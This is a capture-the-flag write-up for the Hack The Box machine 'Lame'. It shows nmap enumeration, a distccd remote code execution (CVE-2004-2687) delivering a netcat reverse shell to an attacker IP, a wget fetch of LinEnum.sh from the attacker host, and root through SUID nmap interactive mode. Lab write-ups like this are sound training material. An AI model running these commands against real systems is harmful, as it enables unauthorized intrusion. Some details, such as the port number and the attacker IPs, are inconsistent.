# HTB-Writeups




   ![image of bashed](/assets/newlamepic.png)


### Enumeration (Information Gathering):
Starting off with an nmap scan to check which ports are open:
1. 21 - ftp
2. 22 - ssh
3. 139, 445 - smb (netbios)

After doing a full port scan using:
`nmap -sC -sV -oA nmap/lamefull 10.10.10.3 --max-retries 0`, we get:


![nmap scan](/assets/Lamenmap.png)



Ports open after **full port** scan:
1. 21 - ftp
2. 22 - ssh
3. 139, 445 - smb

As we can see that port **21/ftp** is open, we can try and connect to it via ftp:
`ftp 10.10.10.3`
After enumerating the ftp server, we could not find anything interesting.
Check out the ftp, ssh, smb versions to see if they are vulnerable, and after googling we find out that they aren't vulnerable.
But after checking out port 3432 distccd, we found that it is vulnerable to a Remote Command Execution. There seems to be an nmap script avaiable for this vulnerability.
There is an nmap script avaiable for this and you can find it here:
[distcc-cve2004-2687 - RCE](https://nmap.org/nsedoc/scripts/distcc-cve2004-2687.html)

### Exploitation

Using the nmap script:
`sudo nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd=cmd"`

Putting out reverse shell payload in place of the cmd argument:
cmd = `/bin/nc -e /bin/sh 10.10.14.9 4445`

Setting up a Netcat listener on our attack machine to catch the shell:
`sudo nc -nlvp 4445`

After executing nmap script, we have successfully got a Reverse shell:

![lame rev shell](/assets/lamerevshell.png)

And we have the **USER SHELL!!!!**

Hence, we can grab the user flag from the directory: /home/makis/

### Privilege Escalation
Running our basic commands for privilege escalation such as checking for sudo rights, checking the kernel, OS version, checking if we belong to any admin groups, etc.
As we find nothing from basic enumeration, we setup a Python Web Server on our machine and get the LinEnum.sh script on our host machine.
Using `wget http://10.10.14.2/LinEnum.sh` to download the script and running `chmod +x LinEnum.sh` to make it executable.

After running the script we see that we have the suid bit enabled on the nmap binary.
SUID bit enabled means that if a file's SUID bit is enabled we can run that file as root.
![nmap suid bit enabled](/assets/privesc.png)

Using nmap in interactive mode:
`sudo nmap --interactive` (important to use sudo as we want to execute the binary as root)
Now running !sh to run bash from nmap.

![root user](/assets/root.png)

And we have got **ROOT!!!!**

## Other ways to exploit this machine:
1. Samba version was vulnerable to an RCE.
2. There was a Privilege Escalation exploit for distccd to get root directly.

